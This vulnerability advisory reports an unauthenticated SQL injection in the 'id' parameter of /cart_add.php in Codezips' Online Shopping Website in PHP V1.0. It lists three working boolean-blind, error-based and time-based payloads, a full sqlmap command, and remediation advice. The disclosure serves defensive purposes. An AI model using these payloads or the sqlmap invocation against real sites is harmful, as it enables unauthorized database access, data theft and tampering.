# <font style="color:rgb(31, 35, 40);">Codezips Online Shopping Website In PHP With Source Code V1.0 /cart_add.php SQL injection</font>
# NAME OF AFFECTED PRODUCT(S)
+ Online Shopping Website In PHP With Source Code

## Vendor Homepage
+ [homepage](https://codezips.com/php/online-shopping-store-in-php-with-source-code/)

# AFFECTED AND/OR FIXED VERSION(S)
## submitter
+ takakie

## Vulnerable File
+ /cart_add.php

## VERSION(S)
+ V1.0

## Software Link
+ [Download Source Code](https://codeload.github.com/codezips/online-shopstore-php/zip/master)

# PROBLEM TYPE
## Vulnerability Type
+ SQL injection

## Root Cause
+ A SQL injection vulnerability was found in the '/cart_add.php' file of the 'Online Shopping Website In PHP With Source Code' project. The reason for this issue is that attackers inject malicious code from the parameter 'id' and use it directly in SQL queries without the need for appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.

## Impact
+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.

# DESCRIPTION
+ During the security review of "Online Shopping Website In PHP With Source Code", takakie discovered a critical SQL injection vulnerability in the "/cart_add.php" file. This vulnerability stems from insufficient user input validation of the 'id' parameter, allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.

# No login or authorization is required to exploit this vulnerability
# Vulnerability details and POC
## Vulnerability type:
+ boolean-based blind
+ errot-base
+ time-based blind

## Vulnerability location:
+ 'id' parameter

## Payload:
```plain
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=3' AND 6547=6547 AND 'Rqbs'='Rqbs

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: id=3' AND GTID_SUBSET(CONCAT(0x7178767071,(SELECT (ELT(1486=1486,1))),0x7176717671),1486) AND 'umhR'='umhR

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=3' AND (SELECT 1069 FROM (SELECT(SLEEP(5)))gLZU) AND 'jJjU'='jJjU
```

## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:
```plain
sqlmap -r test.txt --risk=3 --level=5 --batch --threads=10 --dbms=mysql --random-agent --tamper=space2comment
```

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740491436209-bce641d3-4b2b-4f89-9ebc-224b3b5710f4.png)

![](https://cdn.nlark.com/yuque/0/2025/png/38476061/1740491447394-b0a2c7ef-baa2-451b-9e17-5671521e405b.png)

# Suggested repair
1. **Use prepared statements and parameter binding:**

Preparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.

2. **Input validation and filtering:**

Strictly validate and filter user input data to ensure it conforms to the expected format.

3. **Minimize database user permissions:**

Ensure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.

4. **Regular security audits:**

Regularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.

